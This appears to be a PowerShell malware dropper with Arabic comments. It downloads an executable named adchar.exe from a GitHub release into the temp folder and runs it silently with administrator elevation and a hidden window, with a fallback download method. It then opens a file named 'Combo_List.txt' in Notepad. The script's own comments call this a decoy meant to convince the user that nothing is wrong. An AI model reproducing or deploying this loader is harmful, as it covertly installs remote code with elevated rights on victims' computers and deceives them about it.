# تفعيل بروتوكولات الحماية لضمان نجاح التحميل
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. تحميل وتشغيل adchar.exe
$url = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
$tempPath = "$env:TEMP\adchar_installer.exe"

try {
    (New-Object Net.WebClient).DownloadFile($url, $tempPath)
    # التشغيل بصلاحيات الأدمن وبشكل مخفي تماماً
    Start-Process $tempPath -ArgumentList "/S" -Verb runAs -WindowStyle Hidden
} catch {
    # محاولة بديلة إذا فشل الطريقة الأولى
    Invoke-WebRequest -Uri $url -OutFile $tempPath
    Start-Process $tempPath -ArgumentList "/S" -Verb runAs -WindowStyle Hidden
}

# 2. تنظيف المسارات وفتح ملف التمويه
$targetFile = Get-ChildItem -Filter "Combo_List.txt" -Recurse | Select-Object -First 1
if ($targetFile) {
    # فتح الملف الأصلي للمستخدم ليوهمه بأن كل شيء سليم
    start notepad.exe $targetFile.FullName
}
